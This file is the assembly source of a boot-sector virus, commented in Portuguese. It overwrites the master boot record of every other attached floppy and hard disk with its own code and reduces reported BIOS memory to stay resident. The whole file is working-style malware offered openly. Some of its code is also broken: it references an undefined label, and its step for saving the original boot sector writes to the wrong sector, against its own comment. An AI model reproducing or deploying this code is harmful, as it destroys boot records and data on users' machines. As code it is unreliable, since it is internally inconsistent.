[BITS 16]
[ORG 0x7c00]

start:
    cli                           ; no interrupt zone
    mov byte [DriverID], dl

    mov sp, 0xFFF8
    pusha
    xor ax, ax
    mov ds, ax
    mov es, ax

    xor di, di ; Counter loop_over_disks
loop_over_disks:
    mov dl, [disks+di] ; para int 13h dl recebe o disco a ser lido ou escrito
    
    cmp di, 0x04       ; Verifica se o loop passou por todos os discos
    jge infection_done ; Caso tenha passado por todos os discos, termine o loop
    cmp dl, [DriverID]  ; Verifica se é o disco em que esta sendo executado esse codigo
    jne infect         ; Caso não seja Infecte-o
    next:
        inc di             ; Caso seja vá para o proximo disco
        jmp loop_over_disks

    infect:
        ; Modo:      ah = 2 - leitura
        ; Seção:     al = 1
        ; Driver:    dl = Depende da iteração (percorre todos os discos)
        ; Endereço:  bx = Buffer de Leitura
        mov ah, 0x02
        mov al, 0x01
        xor ch, ch
        mov cl, 0x01
        mov bx, 0x7e00
        xor dh, dh
        int 13h

        jc next ; Carry = 1 - Disco não existe

        ; O bootsector original é enviado para o sector 2
        mov ah, 0x03
        mov al, 0x02
        xor ch, ch
        mov cl, 0x01
        mov bx, 0x7e00
        int 13h
        
        
        ; Escrevemos o codigo infectado no DL (Driver) definido (iteração) Sector 1
        mov ah, 0x03
        mov al, 0x01
        xor ch, ch
        mov cl, 0x01

        mov bx, 0x7c00
        int 13h

        jmp next

infection_done:
memory_persistence:
    ; 0x0413 possui a quantidade de memoria do sistema
    xor ax, ax
    mov ds, ax

    dec word [ds:0x0413] ; Reduz 1 KB de Memoria
    mov ax, [ds:0x0413]  ; AX recebe a quantidade de memoria
    shl ax, 6            ; Dá um ShiftLeft para   
    mov es, ax

    mov dl, [DriverID]
    mov si, transfer_bytes
    xor di, di

    mov cx, end_cpy
    sub cx, transfer_bytes
    rep movsb

    push es
    push word 0x0000
    retf


end_cpy
DriverID db 0

disks:
    db 0x00 ; 1st flp
    db 0x01 ; 2nd flp
    db 0x80 ; Referência: -- typically 0x80 for the "C" drive 
    db 0x81 ; 2nd HD

db "Qual o proposito de existência humana?(ಥ _ ಥ)"

times (0x1b4 - ($-$$)) db 0
part_table:
UID times 10 db 0             ; unique disk ID
PT1 times 16 db 0             ; first partition entry
PT2 times 16 db 0             ; second partition entry
PT3 times 16 db 0             ; third partition entry
PT4 times 16 db 0             ; fourth partition entry

dw 0xAA55
